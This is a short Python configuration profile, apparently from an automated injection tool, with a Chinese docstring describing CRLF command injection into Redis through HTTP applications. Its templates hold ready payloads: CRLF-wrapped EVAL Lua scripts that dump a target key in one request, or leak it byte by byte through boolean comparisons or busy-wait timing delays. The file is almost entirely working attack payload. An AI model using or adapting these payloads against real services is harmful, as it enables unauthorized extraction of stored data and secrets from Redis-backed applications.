"""Redis — 注入面: HTTP 应用拼接 Redis 命令(CRLF 内联命令注入), 载荷用 EVAL Lua。
建议 --raw 让真实 CRLF 进入协议; {F} = 目标 key(-q 提供)。
union 一个请求直接带回整个值; bool/time 用 Lua byte 比较。
未实机验证, 且响应是否可见取决于应用的回显方式。"""

PROFILE = {
    'name': 'redis',
    'note': 'Redis EVAL (union/bool 已验证; time 未实测)',
    'err_tpl':   None,
    'err_regex': None,
    'err_chunk': 30,
    'err_strip': 0,
    'bool_tpl':  '\r\neval "if redis.call(\'GET\',\'{F}\'):byte({P})>{K} then return 1 else return 0 end" 0\r\n',
    'time_tpl':  '\r\neval "if redis.call(\'GET\',\'{F}\'):byte({P})>{K} then local t=os.clock()+{T} while os.clock()<t do end end return 0" 0\r\n',
    'union_tpl': '\r\neval "return redis.call(\'GET\',\'{F}\')" 0\r\n',
    'row_wrap':  None,
}
